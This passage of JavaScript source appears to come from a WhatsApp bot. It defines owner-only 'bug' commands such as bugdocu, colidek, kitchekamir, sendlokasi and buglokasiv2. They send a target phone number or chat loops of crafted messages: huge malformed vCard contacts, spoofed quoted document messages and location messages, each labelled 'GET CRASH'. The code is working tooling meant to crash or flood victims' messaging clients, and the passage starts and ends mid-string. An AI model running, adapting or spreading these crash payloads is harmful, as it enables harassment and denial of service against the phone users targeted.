karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
await m.reply(`Succes`)
}
break
	case 'bugdocu':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'colidek' : {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
                    a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    await haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: doc})
                    m.reply(`BUG COLI DEK`)
                    }
                    break
case 'kitchekamir' : { 
if (!text) throw `Nomernya?`
                    a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"}, {quoted: a})
                    m.reply(`Succes`)
                    }
	break
case 'bugdocument':{
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
y1 = fs.readFileSync('./baseikal/virtex/iphone.mp3')
haikal.sendMessage(m.chat, {document: y1, fileName: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${doc}.mp3`, quoted: m})
haikal.sendMessage(m.chat, {document: y1, fileName: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${jobot}.txt`, quoted: m})
haikal.sendMessage(m.chat, {document: y1, fileName: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap}.js`, quoted: m})
}
}
break
case 'sendlokasi': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\nitem1.TEL:+6285814480623\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: haikal.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
						"degreesLatitude": -6.936928157735237,
						"degreesLongitude": 107.72270679473877,
						"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${philips}`,
						"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: kontolfariz })
haikal.relayMessage(`${text}@s.whatsapp.net`, location.message, { messageId: location.key.id })
await m.reply(`Succes`)
}
break
case 'buglokasiv2': {
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (args.length == 0) return m.reply(`Jumlah?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲\nitem1.TEL:+6285814480623\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 